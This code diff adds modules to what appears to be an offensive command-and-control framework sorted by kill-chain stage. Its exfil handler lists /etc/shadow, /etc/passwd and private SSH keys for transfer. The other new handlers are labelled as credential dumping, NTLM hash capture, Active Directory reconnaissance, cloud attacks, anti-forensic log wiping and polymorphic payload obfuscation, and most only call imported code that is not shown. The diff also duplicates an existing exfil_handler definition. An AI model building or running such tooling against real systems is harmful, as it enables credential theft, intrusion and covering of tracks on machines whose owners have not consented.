@@ -466,6 +466,61 @@ def exfil_handler(params: dict):
     return {"path": path, "bytes": 0, "method": method, "status": "file_not_found"}
 
 
+@registry.register("exfil", "Data exfiltration — chunked encrypted file transfer", "1.0", "exfiltration")
+def exfil_handler(params: dict):
+    path = params.get("path", "")
+    chunk_size = params.get("chunk_size", 65536)
+    if path and os.path.exists(path):
+        size = os.path.getsize(path)
+        chunks = (size + chunk_size - 1) // chunk_size
+        return {"path": path, "bytes": size, "chunks": chunks, "status": "ready"}
+    targets = ["/etc/shadow", "/etc/passwd", os.path.expanduser("~/.ssh/id_rsa")]
+    found = [{"path": t, "bytes": os.path.getsize(t), "status": "available"} for t in targets if os.path.exists(t)]
+    return {"targets": found, "count": len(found), "status": "enumerated"}
+
+
+@registry.register("cred_dump", "Credential dumper — shadow, SSH keys, browser data, LaZagne", "1.0", "actions_on_objective")
+def cred_dump_handler(params: dict):
+    from modules.bridge.handlers.cred_dump import dump_credentials
+    return dump_credentials(params)
+
+
+@registry.register("bloodhound", "BloodHound AD collector — SharpHound + Python LDAP", "1.0", "recon")
+def bloodhound_handler(params: dict):
+    from modules.bridge.handlers.bloodhound import collect_bloodhound
+    return collect_bloodhound(params)
+
+
+@registry.register("responder", "Responder — NTLM hash capture via LLMNR/MDNS", "1.0", "recon")
+def responder_handler(params: dict):
+    from modules.bridge.handlers.attacks import run_responder
+    return run_responder(params)
+
+
+@registry.register("webscan", "Web app scanner — SQLi, XSS, LFI/RFI", "1.0", "recon")
+def webscan_handler(params: dict):
+    from modules.bridge.handlers.attacks import run_webscan
+    return run_webscan(params)
+
+
+@registry.register("cloud", "Cloud attack modules — AWS/Azure/GCP", "1.0", "delivery")
+def cloud_handler(params: dict):
+    from modules.bridge.handlers.attacks import run_cloud_attack
+    return run_cloud_attack(params)
+
+
+@registry.register("cleanup", "Anti-forensics — wipe logs, clear timestamps, remove persistence", "1.0", "actions_on_objective")
+def cleanup_handler(params: dict):
+    from modules.bridge.handlers.attacks import run_cleanup
+    return run_cleanup(params)
+
+
+@registry.register("obfuscate", "Payload obfuscator — polymorphic, XOR, AES, UPX", "1.0", "weaponization")
+def obfuscate_handler(params: dict):
+    from modules.bridge.handlers.attacks import run_obfuscate
+    return run_obfuscate(params)
+
+
 @registry.register("health", "Health check and module listing", "1.0", "c2")
 def health_handler(params: dict):
     """Health check with module listing."""
